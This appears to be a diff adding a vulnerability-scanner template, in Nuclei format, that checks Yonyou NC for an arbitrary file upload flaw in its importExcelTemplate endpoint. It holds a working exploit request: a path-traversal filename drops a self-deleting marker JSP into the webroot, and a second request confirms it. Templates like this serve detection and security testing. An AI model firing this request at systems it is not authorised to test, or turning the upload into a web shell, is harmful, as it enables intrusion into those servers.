@@ -1,0 +1,37 @@
+id: yongyouNC-importExcelTemplate-File-upload
+
+info:
+  name: 用友NC importExcelTemplate 任意文件上传漏洞
+  author: yongyouNC
+  severity: high
+  tags: File upload
+
+variables:
+  username: "{{to_lower(rand_base(6))}}" #从可选字符集（默认为字母和数字）生成给定长度字符串的随机序列
+
+http:
+  - raw:
+      - |
+        POST /portal/pt/infopathimport/importExcelTemplate?pageId=login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryNAL3EsrdN90G1hgq
+
+        ------WebKitFormBoundaryNAL3EsrdN90G1hgq
+        Content-Disposition: form-data; name="Filedata"; filename="./.\webapps\nc_web\{{username}}.jsp"
+        application/octet-stream
+
+        <% out.println("xinnianhao"); new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+        ------WebKitFormBoundaryNAL3EsrdN90G1hgq--
+  - raw:
+      - |
+        GET /{{username}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'xinnianhao'
+      - type: status
+        status: 
+          - 200
